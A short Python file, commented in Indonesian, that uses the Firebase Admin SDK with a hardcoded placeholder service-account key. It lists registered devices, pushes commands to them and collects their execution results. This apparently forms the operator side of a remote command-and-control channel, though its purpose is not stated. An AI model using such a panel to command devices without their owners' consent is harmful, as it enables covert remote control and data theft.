import firebase_admin
from firebase_admin import credentials, db
import json

# Load dari google-services.json
SERVICE_ACCOUNT = {
    "type": "service_account",
    "project_id": "ak-syg-quya",
    "private_key_id": "mock",
    "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDQ...\n-----END PRIVATE KEY-----\n",
    "client_email": "firebase-adminsdk@ak-syg-quya.iam.gserviceaccount.com",
    "client_id": "123456789",
    "auth_uri": "https://accounts.google.com/o/oauth2/auth",
    "token_uri": "https://oauth2.googleapis.com/token",
    "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs"
}

# Inisialisasi Firebase
if not firebase_admin.get_app():
    cred = credentials.Certificate(SERVICE_ACCOUNT)
    firebase_admin.initialize_app(cred, {
        'databaseURL': 'https://ak-syg-quya-default-rtdb.asia-southeast1.firebasedatabase.app'
    })

def get_devices():
    """Ambil semua device yang register"""
    ref = db.reference('devices')
    devices = ref.get()
    return devices if devices else {}

def send_command(session_id, command):
    """Kirim command ke device via Firebase"""
    ref = db.reference(f'commands/{session_id}')
    ref.set(command)

def get_results(session_id):
    """Ambil hasil eksekusi dari device"""
    ref = db.reference(f'results/{session_id}')
    return ref.get()

